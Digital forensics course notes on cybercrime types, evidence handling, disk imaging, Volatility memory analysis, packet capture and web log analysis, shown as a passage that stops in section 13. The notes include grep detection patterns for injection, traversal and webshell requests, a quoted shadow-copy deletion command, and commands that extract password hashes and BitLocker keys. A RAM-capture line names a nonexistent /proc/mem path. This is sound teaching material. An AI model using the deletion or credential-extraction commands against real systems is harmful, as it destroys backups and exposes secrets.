# Digital Forensics — Complete Course Notes

### Cybersecurity Department | Computer Architecture & Security Series

> **Series context:** This builds on your Architecture notes (Von Neumann, Registers). Forensics is the _post-incident_ discipline — after attackers exploit the vulnerabilities covered in your previous notes, forensics investigators find out what happened, who did it, and gather court-admissible proof.
> **Lab targets:** Your own web apps, Metasploitable2, personal Linux/Windows system
> **Tools:** Autopsy, Volatility, Wireshark, FTK Imager, Sleuth Kit, Binwalk

---

## Table of Contents

1. [What Is Digital Forensics?](#1-what-is-digital-forensics)
2. [Prerequisite Roadmap](#2-prerequisite-roadmap)
3. [Certifications & Career Roles](#3-certifications--career-roles)
4. [Classification of Cyber Crimes](#4-classification-of-cyber-crimes)
5. [Types of Attacks — Internal vs External](#5-types-of-attacks--internal-vs-external)
6. [Digital Evidence — Theory](#6-digital-evidence--theory)
7. [Volatile vs Non-Volatile Data](#7-volatile-vs-non-volatile-data)
8. [Types of Digital Forensics](#8-types-of-digital-forensics)
9. [The Forensic Investigation Process](#9-the-forensic-investigation-process)
10. [Forensic Imaging — Theory & Lab](#10-forensic-imaging--theory--lab)
11. [Memory Forensics Lab](#11-memory-forensics-lab)
12. [Network Forensics Lab](#12-network-forensics-lab)
13. [Web & Log Forensics on Your Own Sites](#13-web--log-forensics-on-your-own-sites)
14. [Metasploitable2 — Attack Then Investigate](#14-metasploitable2--attack-then-investigate)
15. [Anti-Forensics — What Attackers Do to Hide](#15-anti-forensics--what-attackers-do-to-hide)
16. [Tools Master Reference](#16-tools-master-reference)
17. [Attack → Forensic Artifact Mapping](#17-attack--forensic-artifact-mapping)

---

## 1. What Is Digital Forensics?

### Simple Definition

**Forensics** = studying something _in complete detail_, from A to Z, leaving nothing unknown.
**Digital Forensics** = applying that same thorough investigation to digital devices involved in crimes.

```
Traditional Crime Scene:       Digital Crime Scene:
────────────────────────       ──────────────────────
Fingerprints                   Browser history
Footprints                     Log files
Witness statements             Network traffic captures
Physical evidence              RAM dumps
Documents                      Deleted files (recoverable)
Weapon                         Malware samples
```

### The Forensic Analyst's Job

A cyber forensic analyst enters _after_ the crime. Their job:

```
Crime committed
      │
      ▼
┌─────────────────┐
│  IDENTIFY       │  Find which devices were involved
├─────────────────┤
│  PRESERVE       │  Protect evidence from alteration (hashing, imaging)
├─────────────────┤
│  COLLECT        │  Gather all digital artifacts
├─────────────────┤
│  EXAMINE        │  Extract relevant data from devices
├─────────────────┤
│  ANALYZE        │  Interpret what the data means
├─────────────────┤
│  PRESENT        │  Write court-admissible report
└─────────────────┘
```

### Real-World Example: Murder Scene Phone

```
Crime: Murder found near victim
Evidence: Mobile phone found at scene

Police role:      Investigate the physical murder
Forensic role:    Investigate the phone
                  → Who was the last call to/from?
                  → What WhatsApp/SMS messages exist?
                  → GPS location data — where was the phone?
                  → Were threatening messages sent?
                  → Was this phone used to plan the crime?
                  → Were files deleted? (Recover them)
```

---

## 2. Prerequisite Roadmap

Before jumping into advanced forensics, you need these foundations. As a software engineer and cybersecurity student you likely have most of these:

```
Level 1: NETWORKING ──────────────────────────────────────────────┐
  TCP/IP, OSI model, DNS, HTTP, Wireshark packet analysis          │
  Why: Network forensics requires knowing normal vs abnormal       │
  traffic. Every attack leaves network footprints.                 │
                                                                    │
Level 2: ETHICAL HACKING ─────────────────────────────────────────┤
  Know how attacks work BEFORE investigating them                  │
  Why: You can't find evidence of a SQL injection if you           │
  don't understand what SQL injection looks like in logs           │
                                                                    │
Level 3: OPERATING SYSTEMS ───────────────────────────────────────┤
  Linux (file system, processes, logs) + Windows (registry,        │
  event logs, NTFS) + How memory management works                  │
  Why: Evidence lives inside OS structures                          │
                                                                    │
Level 4: PROGRAMMING (C / Python) ────────────────────────────────┤
  Script analysis, writing parsers for log files,                  │
  understanding malware source code                                │
                                                                    │
Level 5: DIGITAL FORENSICS ◀──────────────────────────────────────┘
  Now you can properly investigate crimes
```

---

## 3. Certifications & Career Roles

### Major Certifications

| Certification | Full Name                              | Provider   | Focus                           |
| ------------- | -------------------------------------- | ---------- | ------------------------------- |
| **CHFI**      | Computer Hacking Forensic Investigator | EC-Council | Most recognized; comprehensive  |
| **CDFE**      | Certified Digital Forensics Examiner   | Mile2      | Examiner focus                  |
| **CFCE**      | Certified Forensic Computer Examiner   | IACIS      | Law enforcement oriented        |
| **EnCE**      | EnCase Certified Examiner              | OpenText   | Tool-specific (EnCase software) |
| **ACE**       | AccessData Certified Examiner          | AccessData | Tool-specific (FTK software)    |
| **GCFE**      | GIAC Certified Forensic Examiner       | SANS/GIAC  | Highly respected, technical     |
| **GCFA**      | GIAC Certified Forensic Analyst        | SANS/GIAC  | Advanced incident response      |

> **Recommendation for your profile (software engineer + cybersec student):**
> Start with **CHFI** for broad coverage, then **GCFA** for advanced technical depth.

### Career Roles & Salary

| Role                                     | What You Do                                                   | Approx. Salary (India) |
| ---------------------------------------- | ------------------------------------------------------------- | ---------------------- |
| **Digital Forensics Analyst/Examiner**   | Examine devices, extract data, write reports                  | ₹6–10 LPA              |
| **Incident Responder**                   | Respond to active breaches, contain damage, investigate cause | ₹8–15 LPA              |
| **Cyber Security Consultant**            | Advise organizations on security posture                      | ₹10–20 LPA             |
| **Law Enforcement Officer (Cyber Cell)** | Work with police/CBI cyber units                              | Govt scale             |
| **Expert Witness**                       | Testify in court as technical authority                       | Case-based             |
| **Forensic Researcher/Developer**        | Build forensic tools, research new techniques                 | ₹12–25 LPA             |
| **Cyber Threat Intelligence Analyst**    | Track threat actors, identify TTPs                            | ₹8–18 LPA              |
| **Forensic Accountant**                  | Investigate financial crimes, money laundering                | ₹8–15 LPA              |
| **Malware Analyst**                      | Reverse engineer malware, write signatures                    | ₹10–20 LPA             |

---

## 4. Classification of Cyber Crimes

Crimes are classified by **who the target is** (their motive determines the category).

### Category 1: Cyber Crimes Against Individuals

**Target:** A single person

| Crime                                  | Description                                        | Technical Detail                                            |
| -------------------------------------- | -------------------------------------------------- | ----------------------------------------------------------- |
| **Identity Theft**                     | Stealing someone's identity to impersonate them    | SIM swapping, credential stuffing, phishing harvested creds |
| **Online Harassment / Cyber Stalking** | Threatening, following, monitoring a person online | Social media scraping, tracking pixels, stalkerware apps    |
| **Cyber Bullying**                     | Targeted intimidation online                       | Fake accounts, doxxing (exposing private info)              |
| **Sextortion**                         | Threatening to release intimate images             | RAT-based webcam capture, social engineering                |
| **Phishing (targeted)**                | Spear-phishing a specific person                   | Crafted emails spoofing trusted contacts                    |

**Forensic approach:** Social media account analysis, mobile device extraction, IP address tracing, chat log recovery.

---

### Category 2: Financial Crimes

**Target:** Money — from individuals or organizations

| Crime                               | Description                                     | Technical Detail                                               |
| ----------------------------------- | ----------------------------------------------- | -------------------------------------------------------------- |
| **Payment Card Fraud / Carding**    | Cloning or using stolen card details            | Skimmers on ATMs, dark web card dumps, POS malware             |
| **Phishing & Email Scams**          | Fake websites/emails to steal credentials       | Lookalike domains (arnazon.com), email spoofing                |
| **Ransomware Attack**               | Encrypt victim's files, demand ransom           | AES-256 encrypted files, .onion payment address, crypto ransom |
| **Business Email Compromise (BEC)** | Impersonate CEO/CFO to authorize wire transfers | Email domain spoofing, account takeover                        |
| **Cryptocurrency Fraud**            | Fake exchanges, rug pulls, wallet theft         | Smart contract exploits, fake DeFi platforms                   |
| **Online Banking Fraud**            | Unauthorized access to bank accounts            | Credential theft, session hijacking, SS7 attacks               |

**Forensic approach:** Transaction tracing on blockchain, email header analysis, malware reverse engineering, server logs.

**Ransomware forensic artifacts to look for:**

```
- Encrypted files with new extension (.locked, .crypt, .WNCRY)
- Ransom note files (README.txt, HOW_TO_DECRYPT.html)
- Registry modifications (persistence mechanisms)
- Shadow copy deletion: vssadmin.exe delete shadows /all
- Network connections to C2 servers
- Prefetch files showing ransomware binary execution
```

---

### Category 3: Cyber Crimes Against Organizations

**Target:** A company or institution

| Crime                           | Description                                        | Technical Detail                                   |
| ------------------------------- | -------------------------------------------------- | -------------------------------------------------- |
| **Data Breach**                 | Unauthorized access + exfiltration of company data | SQL injection, credential stuffing, insider threat |
| **Intellectual Property Theft** | Stealing source code, trade secrets, patents       | Exfiltration via USB/cloud, code repo cloning      |
| **Corporate Espionage**         | Competitor spying on internal operations           | APT campaigns, spear phishing executives           |
| **Sabotage**                    | Destroying data or disrupting operations           | Logic bombs, wiper malware (NotPetya)              |
| **Supply Chain Attack**         | Compromising a vendor to reach the real target     | SolarWinds, XZ Utils backdoor                      |

**Famous examples:**

- **Sony Pictures Hack (2014):** North Korean APT, wiped servers, leaked unreleased movies
- **Target Breach (2013):** Attackers entered via HVAC vendor credentials
- **SolarWinds (2020):** Malicious update pushed to 18,000 organizations

---

### Category 4: Cyber Terrorism & State-Sponsored Attacks

**Target:** Governments, critical infrastructure, entire nations

| Crime                                 | Description                                | Example                                      |
| ------------------------------------- | ------------------------------------------ | -------------------------------------------- |
| **Cyber Warfare**                     | State vs state digital attacks             | Stuxnet destroying Iranian centrifuges       |
| **Cyber Propaganda / Disinformation** | Spreading false information to destabilize | Election interference social media campaigns |
| **Cyber Espionage**                   | Stealing classified government information | APT28 (Russia), APT41 (China)                |
| **Critical Infrastructure Attack**    | Power grids, water treatment, hospitals    | Ukraine power grid attack (2015, 2016)       |

---

### Category 5: Cyber Crimes Against Government

| Crime                        | Description                                             |
| ---------------------------- | ------------------------------------------------------- |
| **Government System Attack** | Hacking government websites, databases                  |
| **Cyber Terrorism**          | Using digital means to spread terror, leak intelligence |
| **Defacement**               | Changing government website content                     |

---

## 5. Types of Attacks — Internal vs External

### Internal Attacks

**Who:** Employees, contractors, former staff with inside access (insider threats)

```
Insider Threat Categories:
┌──────────────────┬──────────────────┬──────────────────┐
│   Malicious      │   Negligent      │   Compromised    │
│   Insider        │   Insider        │   Insider        │
│                  │                  │                  │
│ Deliberately     │ Accidentally     │ Account taken    │
│ steals/sabotages │ causes breach    │ over by attacker │
│ data             │ (clicks phishing)│                  │
└──────────────────┴──────────────────┴──────────────────┘
```

| Internal Attack         | Description                                   | Forensic Artifacts                                               |
| ----------------------- | --------------------------------------------- | ---------------------------------------------------------------- |
| **Spying**              | Monitoring internal communications, systems   | Keylogger traces, unauthorized log access                        |
| **IP Theft**            | Copying source code, designs to USB/cloud     | DLP logs, USB device history, cloud sync logs                    |
| **Record Manipulation** | Altering database records, financial data     | Database audit logs, transaction logs, before/after checksums    |
| **Trojan Horse**        | Installing RAT/backdoor from inside network   | Scheduled tasks, startup entries, network connections to C2      |
| **Sabotage**            | Deleting critical files, corrupting databases | File deletion logs, $RECYCLE.BIN artifacts, Recycle Bin metadata |

**Key insight:** Internal attackers are already past the firewall. They often have legitimate credentials, making detection harder. Forensics relies on behavior analytics and audit logs.

---

### External Attacks

**Who:** Outside attackers with no prior legitimate access

| External Attack               | How It Works                           | Forensic Evidence Left Behind                                       |
| ----------------------------- | -------------------------------------- | ------------------------------------------------------------------- |
| **SQL Injection**             | Malicious SQL in web form inputs       | Web server access logs (malformed queries), DB error logs, WAF logs |
| **Brute Force**               | Try thousands of passwords             | Failed login attempts in auth logs, rate-limited IP addresses       |
| **Phishing / Identity Theft** | Fake websites steal credentials        | Email headers, domain registration records, proxy logs              |
| **Spoofing**                  | Fake IP/email/MAC to hide identity     | Inconsistencies in packet headers, ARP tables                       |
| **DoS / DDoS Attack**         | Flood server beyond capacity           | Traffic volume spikes in NetFlow, repeated requests from many IPs   |
| **Cyber Defamation**          | Posting false harmful content online   | Account creation records, IP logs, content metadata                 |
| **Computer Vandalism**        | Physical destruction of hardware       | Physical inspection, security camera footage (non-digital evidence) |
| **XSS**                       | Inject malicious scripts into websites | Web logs showing `<script>` in GET/POST params                      |
| **Man-in-the-Middle**         | Intercept communication                | ARP cache poisoning artifacts, TLS cert anomalies                   |

---

### DoS Attack — Technical Deep Dive

```
Normal server:
  Capacity = 100 concurrent connections
  Users 1–100 → handled normally
  User 101 → rejected (but server stays up)

DoS Attack:
  Attacker sends 10,000+ requests per second
  Server queue fills → legitimate users can't connect
  CPU maxes out → server may crash

DDoS (Distributed DoS):
  Same concept but requests come from thousands of
  compromised machines (botnet) making source blocking impossible

Types:
  Volumetric: Flood bandwidth (UDP flood, ICMP flood)
  Protocol:   Exhaust state tables (SYN flood)
  Application: Exhaust CPU (HTTP GET flood, Slowloris)
```

**Forensic artifacts for DoS:**

```bash
# Apache access log during DDoS — thousands of lines like:
192.168.1.x - - [17/Jul/2026:14:23:01] "GET / HTTP/1.1" 200 1234
192.168.1.x - - [17/Jul/2026:14:23:01] "GET / HTTP/1.1" 200 1234
# (repeated 10,000+ times per second from same/multiple IPs)

# NetFlow/tcpdump shows abnormal traffic volume:
tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0'  # See SYN flood
```

---

## 6. Digital Evidence — Theory

### What Can Be Digital Evidence?

Any digital device or data that is **relevant to a crime** can be presented as evidence:

| Device/Medium       | What to Extract                                              |
| ------------------- | ------------------------------------------------------------ |
| **Internet/Web**    | Browsing history, cookies, cached pages, downloads           |
| **Mobile Phone**    | Call logs, SMS, WhatsApp, GPS history, photos, deleted data  |
| **Laptop/PC**       | Files, emails, browser history, RAM dump, installed programs |
| **Pen Drive / USB** | Files, metadata, file system artifacts                       |
| **Digital Camera**  | Photos/videos with EXIF data (GPS, timestamp, camera model)  |
| **Smartwatch**      | Call logs, health data, location, voice commands             |
| **Hard Drive**      | All files including deleted ones (recoverable via forensics) |
| **Cloud Accounts**  | Google Drive, Dropbox, iCloud — with legal subpoena          |
| **CCTV/IP Camera**  | Video footage with timestamps                                |
| **Router/Switch**   | DHCP leases, connection logs, MAC address history            |
| **Email Servers**   | Full email headers, deleted emails, attachments              |

### Rules for Admissible Evidence — The UAARC Framework

For digital evidence to be accepted in court, it must satisfy all of these:

```
┌─────────────────────────────────────────────────────────┐
│  U — UNDERSTANDABLE                                     │
│  Evidence must be explainable to a non-technical judge  │
│  "This log shows the attacker's IP address connected    │
│   to the victim's server at 2:15 AM"                   │
├─────────────────────────────────────────────────────────┤
│  A — ADMISSIBLE (Relevant)                              │
│  Directly related to the crime under investigation      │
│  Cannot present random unrelated device contents        │
├─────────────────────────────────────────────────────────┤
│  A — AUTHENTIC                                          │
│  Evidence has NOT been tampered with since collection   │
│  PROVEN via: MD5/SHA256 hash values                     │
│  Hash at collection = Hash in court → authentic         │
│  Hash changed → tampered → inadmissible                 │
├─────────────────────────────────────────────────────────┤
│  R — RELIABLE                                           │
│  Collection process was proper, documented, supervised  │
│  Chain of custody maintained throughout                 │
├─────────────────────────────────────────────────────────┤
│  C — COMPLETE                                           │
│  Evidence tells the whole story, not a partial picture  │
│  Cannot cherry-pick only incriminating data             │
└─────────────────────────────────────────────────────────┘
```

### Hash Values — The Authenticity Guarantee

Hashing is the technical backbone of forensic evidence integrity:

```python
# Why hashing proves authenticity:
original_file   → SHA256 → "a3f5c9d2e1..."   (hash at crime scene)
submitted_file  → SHA256 → "a3f5c9d2e1..."   (same hash = untampered)

# If even ONE BIT changes:
modified_file   → SHA256 → "7b2e8a1f3c..."   (completely different → tampered!)
```

```bash
# Real commands used by forensic analysts:
md5sum evidence.img              # Generate MD5 hash
sha256sum evidence.img           # Generate SHA256 hash (more secure)
sha256sum evidence.img > evidence.img.sha256    # Save hash to file

# Verify later:
sha256sum -c evidence.img.sha256     # PASS = untampered, FAIL = tampered
```

### Chain of Custody

Every time evidence changes hands, it must be documented:

```
Evidence collected from crime scene by: [Name, badge, date, time]
         ↓
Transported to lab by: [Name, date, time, sealed bag #]
         ↓
Received by lab technician: [Name, date, time]
         ↓
Forensic image created by: [Name, tool used, hash values, date]
         ↓
Analysis performed by: [Name, dates, tools]
         ↓
Submitted to court by: [Name, date, case number]

Any break in this chain = evidence challenged in court
```

---

## 7. Volatile vs Non-Volatile Data

This distinction is critical — **you must capture volatile data first** before anything else, because it disappears when the device is powered off.

```
┌───────────────────────────────┬──────────────────────────────────────┐
│      VOLATILE DATA            │        NON-VOLATILE DATA             │
│   (Lost when power off)       │      (Survives power off)            │
├───────────────────────────────┼──────────────────────────────────────┤
│ • RAM contents                │ • Hard drive / SSD files             │
│ • CPU registers               │ • USB drive contents                 │
│ • Running processes           │ • SD card contents                   │
│ • Network connections         │ • Email archives                     │
│ • Clipboard contents          │ • Browser history (stored on disk)   │
│ • Encryption keys in memory   │ • Log files                          │
│ • Decrypted data in RAM       │ • Registry (Windows)                 │
│ • ARP cache                   │ • Deleted files (recoverable)        │
│ • Routing tables              │ • File metadata (MAC times)          │
│ • Logged-in user sessions     │ • Installed programs list            │
│ • Cache                       │ • Database files                     │
└───────────────────────────────┴──────────────────────────────────────┘
```

### Order of Volatility (RFC 3227)

Always collect in this order — most volatile first:

```
1.  CPU registers, cache                          ← Most volatile
2.  Routing tables, ARP cache, process tables
3.  Memory (RAM)
4.  Temporary file systems
5.  Disk (fixed drives)
6.  Remote logging and monitoring data
7.  Physical configuration, network topology
8.  Archival media (backups, tapes)              ← Least volatile
```

> **Real scenario:** Ransomware is running and encrypting files. If you pull the plug immediately:
>
> - You stop the encryption ✓
> - But you lose the encryption key from RAM ✗ (no decryption possible)
>   **Forensic decision:** Capture RAM first, THEN power off.

---

## 8. Types of Digital Forensics

| Branch                      | What Is Investigated                            | Key Tools                              |
| --------------------------- | ----------------------------------------------- | -------------------------------------- |
| **Computer Forensics**      | Laptops, desktops — files, OS artifacts         | Autopsy, FTK, Sleuth Kit               |
| **Mobile Device Forensics** | Phones, tablets — calls, messages, apps         | Cellebrite, UFED, Oxygen Forensics     |
| **Network Forensics**       | Network traffic, firewall logs, IDS alerts      | Wireshark, Zeek, NetworkMiner          |
| **Memory Forensics**        | RAM dumps — running processes, encryption keys  | Volatility, Rekall                     |
| **Database Forensics**      | SQL databases — records, logs, deleted entries  | SQL queries, Autopsy DB module         |
| **Cloud Forensics**         | AWS/GCP/Azure logs, SaaS data (with warrants)   | Cloud provider APIs, logging services  |
| **IoT Forensics**           | Smart devices — CCTV, smart TVs, routers        | Custom extraction, firmware analysis   |
| **Social Media Forensics**  | Facebook, Instagram, Twitter account data       | OSINT tools, platform data exports     |
| **OS Forensics**            | Registry, event logs, prefetch, LNK files       | RegRipper, Windows Event Viewer        |
| **Email Forensics**         | Headers, metadata, attachments, deleted emails  | MailXaminer, Email Header Analyzer     |
| **Dark Web Forensics**      | Tor-based sites, .onion addresses, dark markets | Tor Browser analysis, traffic analysis |
| **Malware Forensics**       | Reverse engineering malicious software          | Ghidra, IDA Pro, Cuckoo Sandbox        |
| **Audio/Video Forensics**   | Verifying authenticity, detecting deepfakes     | Amped FIVE, audio spectrum analysis    |

---

## 9. The Forensic Investigation Process

### Standard Digital Forensics Methodology

```
┌────────────────────────────────────────────────────────────────┐
│  PHASE 1: IDENTIFICATION                                       │
│  ─────────────────────────────────────────────────────────     │
│  • Identify all devices at crime scene                        │
│  • Photograph everything before touching                      │
│  • Note powered-on vs powered-off devices                     │
│  • Document network connections, open programs on screen      │
└────────────────────────┬───────────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────────┐
│  PHASE 2: PRESERVATION                                         │
│  ─────────────────────────────────────────────────────────     │
│  • NEVER work on original evidence directly                   │
│  • If device is ON: capture RAM first (volatile)              │
│  • Write-block all storage media before imaging               │
│  • Seal devices in anti-static, Faraday bags (for mobile)     │
│  • Calculate and document hash values                         │
└────────────────────────┬───────────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────────┐
│  PHASE 3: COLLECTION / ACQUISITION                             │
│  ─────────────────────────────────────────────────────────     │
│  • Create forensic image (bit-for-bit copy)                   │
│  • Capture RAM dump (for live systems)                        │
│  • Collect logs, network traffic                              │
│  • Document all tools and procedures used                     │
└────────────────────────┬───────────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────────┐
│  PHASE 4: EXAMINATION                                          │
│  ─────────────────────────────────────────────────────────     │
│  • Work only on the COPY, never original                      │
│  • Extract files, recover deleted data                        │
│  • Parse file system structures                               │
│  • Recover deleted files from unallocated space               │
└────────────────────────┬───────────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────────┐
│  PHASE 5: ANALYSIS                                             │
│  ─────────────────────────────────────────────────────────     │
│  • Timeline reconstruction                                    │
│  • Correlate findings across devices                          │
│  • Identify artifacts relevant to the crime                   │
│  • Look for counter-forensic activity (file wiping, etc.)     │
└────────────────────────┬───────────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────────┐
│  PHASE 6: REPORTING & PRESENTATION                             │
│  ─────────────────────────────────────────────────────────     │
│  • Write formal report (understandable to non-technical jury) │
│  • Include methodology, tools, hash values                    │
│  • Timeline of events                                         │
│  • Expert witness testimony if required                       │
└────────────────────────────────────────────────────────────────┘
```

---

## 10. Forensic Imaging — Theory & Lab

### Why Make a Forensic Image (Not Just a Copy)?

A regular file copy (`cp` or drag-and-drop):

- Copies only allocated files
- Changes access timestamps of files (modifies evidence!)
- Misses deleted files, slack space, unallocated space

A forensic image:

- Copies **every single bit** including deleted files, slack space, and unallocated space
- Does **not** modify source device at all (read-only via write blocker)
- Can be verified with hash values

```
Original Drive:
┌──────────────────────────────────────────────────┐
│ Allocated files │ Deleted files │ Slack space     │
│ (visible)       │ (invisible)   │ (fragments)     │
└──────────────────────────────────────────────────┘

Regular copy: only gets ████████ (visible files)
Forensic image: gets ████████████████████████████ (EVERYTHING)
                                   ↑ this is where deleted evidence hides
```

### Lab: Create Forensic Image with `dd` and `dcfldd`

```bash
# ─────────────────────────────────────────────
# SCENARIO: You have a USB drive (/dev/sdb) as "evidence"
# Create a forensic image of it
# ─────────────────────────────────────────────

# Step 1: Identify the device (NEVER guess — wrong device = disaster)
lsblk
fdisk -l
# Identify your evidence drive, e.g., /dev/sdb

# Step 2: Mount NOTHING — keep it unmounted to avoid changes
# If already mounted:
umount /dev/sdb

# Step 3: Generate BEFORE hash (proves original state)
sha256sum /dev/sdb > /evidence/before_hash.txt
cat /evidence/before_hash.txt

# Step 4: Create forensic image using dd
dd if=/dev/sdb of=/evidence/usb_image.img bs=512 conv=noerror,sync status=progress
# if = input file (source device)
# of = output file (image destination)
# bs = block size (512 bytes)
# conv=noerror,sync = continue on read errors, fill with zeros
# status=progress = show progress

# Step 5: Better option — dcfldd (forensic dd with hashing built in)
apt install dcfldd -y
dcfldd if=/dev/sdb of=/evidence/usb_image.img hash=sha256 hashlog=/evidence/hash.log

# Step 6: Verify image integrity
sha256sum /evidence/usb_image.img
# Compare with before_hash.txt — they MUST match

# Step 7: Open image in Autopsy for analysis
# (Autopsy is GUI-based, see below)
```

### Lab: Autopsy — GUI Forensic Analysis

```bash
# Install Autopsy (Kali Linux)
apt install autopsy -y
autopsy
# Opens web interface at http://localhost:9999/autopsy

# Steps in Autopsy:
# 1. New Case → enter case name, investigator name, evidence number
# 2. Add Image → select your .img file
# 3. Autopsy automatically:
#    - Recovers deleted files
#    - Extracts browser history
#    - Finds documents, images
#    - Builds file timeline
#    - Extracts EXIF from photos
# 4. Results organized by category
# 5. Export report
```

### Lab: FTK Imager (Windows — also works for Linux images)

```
FTK Imager (free from AccessData):
File → Create Disk Image → Physical Drive → Select evidence drive
Image Type: E01 (Expert Witness Format — compressed, has built-in hashing)
Evidence number, examiner name → Start
Hash automatically calculated and saved in .txt alongside image
```

---

## 11. Memory Forensics Lab

### Why Memory Forensics?

RAM contains what was **happening** at the moment of capture:

- Running malware (even if it deletes itself from disk)
- Decrypted data (ransomware decryption keys!)
- Browser sessions, passwords in plaintext
- Network connections
- User activity

### Lab: Capture RAM on Live Linux System

```bash
# Method 1: /proc/mem (Linux)
dd if=/proc/mem of=/tmp/ram.dump bs=1M 2>/dev/null

# Method 2: LiME (Linux Memory Extractor) — best method
# Install LiME
apt install git build-essential linux-headers-$(uname -r) -y
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make
# Load LiME kernel module to capture RAM:
sudo insmod lime-$(uname -r).ko "path=/tmp/ram.lime format=lime"
ls -lh /tmp/ram.lime    # Your RAM dump!

# Method 3: On Metasploitable2 via Meterpreter
meterpreter > run post/linux/gather/memory_dump
```

### Lab: Analyze RAM with Volatility 3

```bash
# Install Volatility3
pip3 install volatility3

# Basic RAM analysis commands:
vol -f /tmp/ram.lime linux.pslist          # List running processes
vol -f /tmp/ram.lime linux.netstat         # Network connections at time of capture
vol -f /tmp/ram.lime linux.bash            # Bash history from RAM
vol -f /tmp/ram.lime linux.malfind         # Find suspicious injected code
vol -f /tmp/ram.lime linux.files           # Open file handles
vol -f /tmp/ram.lime linux.lsmod           # Loaded kernel modules (rootkit detection)

# For Windows RAM dumps:
vol -f memory.dmp windows.pslist           # Process list
vol -f memory.dmp windows.netscan          # Network connections
vol -f memory.dmp windows.cmdline          # Command line args of processes
vol -f memory.dmp windows.malfind          # Find injected shellcode in processes
vol -f memory.dmp windows.hashdump         # Extract NTLM password hashes!
vol -f memory.dmp windows.clipboard        # What was in clipboard
vol -f memory.dmp windows.iehistory        # Internet Explorer history
vol -f memory.dmp windows.filescan        # All file handles in memory

# Look for encryption keys (e.g., BitLocker, TrueCrypt):
vol -f memory.dmp windows.bitlocker        # Extract BitLocker FVEK keys!
```

### What to Look for in RAM During Malware Investigation

```bash
# 1. Processes with no parent (orphaned — suspicious):
vol -f ram.lime linux.pslist | awk '{print $3, $4}'  # Check PPIDs

# 2. Processes with unusual names or paths:
vol -f ram.lime linux.psaux    # Full command lines — look for base64, /tmp/ paths

# 3. Network connections to unknown IPs:
vol -f ram.lime linux.netstat  # Any connections to foreign IPs on unusual ports?

# 4. Code injection — executable memory in unexpected places:
vol -f ram.lime linux.malfind  # Reports regions marked rwx (read-write-execute = suspicious)

# 5. Strings in RAM (passwords, URLs, commands):
strings /tmp/ram.lime | grep -i "password"
strings /tmp/ram.lime | grep -E "https?://"
strings /tmp/ram.lime | grep -i "bitcoin"
```

---

## 12. Network Forensics Lab

### What Network Forensics Captures

Network forensics captures data **in transit** — what was sent/received over the wire. This reveals:

- Which attacker IP connected to victim
- What data was exfiltrated
- What commands were sent (if unencrypted)
- DNS queries (what domains were looked up)
- Login credentials (if sent over HTTP/Telnet/FTP — unencrypted)

### Lab: Capture Traffic with Wireshark / tcpdump

```bash
# On Kali — capture all traffic on eth0:
tcpdump -i eth0 -w /evidence/capture.pcap

# Capture only HTTP traffic:
tcpdump -i eth0 port 80 -w /evidence/http.pcap

# Capture traffic to/from Metasploitable2:
tcpdump -i eth0 host 192.168.100.x -w /evidence/victim_traffic.pcap

# Open in Wireshark:
wireshark /evidence/capture.pcap
```

### Wireshark Analysis for Forensics

```
Key Wireshark filters for investigation:

http                          → All HTTP traffic
http.request.method == "POST" → POST requests (form submissions, logins)
http contains "password"      → HTTP traffic containing "password"
ftp                           → FTP commands (credentials in plaintext!)
telnet                        → Telnet sessions (everything plaintext)
tcp.flags.syn == 1            → SYN packets (port scans, DoS)
dns                           → All DNS queries
dns.qry.name contains "evil"  → DNS for suspicious domain

Follow TCP Stream (right-click packet → Follow → TCP Stream):
  → Reconstructs entire conversation between two endpoints
  → Shows credentials sent over FTP, Telnet, HTTP in plaintext
```

### Lab: Reconstruct FTP Credentials from pcap

```bash
# If you ran an FTP attack against Metasploitable2 and captured traffic:
tcpdump -i eth0 host 192.168.100.x and port 21 -w /evidence/ftp.pcap

# Now analyze with tshark (command-line Wireshark):
tshark -r /evidence/ftp.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
# Output:
# USER    anonymous
# PASS    secret123    ← Plaintext password captured!
```

### Lab: Extract Files from pcap (NetworkMiner)

```bash
# NetworkMiner can extract files sent over network:
# Images, documents, executables — reconstructed from TCP streams

# Install:
apt install networkminer -y
networkminer /evidence/capture.pcap
# GUI opens showing extracted files, credentials, sessions
```

---

## 13. Web & Log Forensics on Your Own Sites

Since you're a software engineer with your own websites, this is your most practical lab environment. Set up intentionally vulnerable versions for forensics practice.

### Apache/Nginx Access Log Analysis

```bash
# Your web server logs are your forensic goldmine:
# Apache: /var/log/apache2/access.log
# Nginx:  /var/log/nginx/access.log

# Standard log format:
# IP - - [date] "METHOD /path HTTP/1.1" status bytes "referer" "user-agent"
# 192.168.1.100 - - [17/Jul/2026:14:23:01 +0000] "GET /login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
```

```bash
# FORENSIC ANALYSIS COMMANDS:

# 1. Find SQL injection attempts:
grep -i "union\|select\|drop\|insert\|--\|0x\|char(" /var/log/apache2/access.log

# 2. Find XSS attempts:
grep -i "script\|alert\|onerror\|javascript:" /var/log/apache2/access.log

# 3. Find directory traversal:
grep -i "\.\./\|%2e%2e\|etc/passwd" /var/log/apache2/access.log

# 4. Find brute force (many 401/403 from same IP):
grep " 401 " /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head

# 5. Find DoS (massive requests from one IP):
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# 6. Reconstruct attack timeline:
grep "192.168.1.100" /var/log/apache2/access.log | awk '{print $4}' | sort

# 7. Find file upload attempts (potential webshell upload):
grep -i "POST.*upload\|POST.*file" /var/log/apache2/access.log

# 8. Find webshell execution (attacker running commands):
grep -i "cmd=\|exec=\|system=\|passthru=\|shell_exec=" /var/log/apache2/access.log
```

### PHP Error Log Forensics

```bash
# /var/log/apache2/error.log or /var/log/php_errors.log
# SQL errors reveal injection points:
grep -i "mysql_error\|SQL syntax\|You have an error in your SQL" /var/log/apache2/error.log

# File inclusion errors reveal LFI attempts:
grep -i "failed to open stream\|No such file" /var/log/apache2/error.log
```

### MySQL Binary Log (Database Forensics)

```bash
# Enable MySQL binary logging (add to my.cnf):
# [mysqld]
# log_bin = /var/log/mysql/mysql-bin.log
# binlog_format = ROW

# Analyze binary log for unauthorized queries:
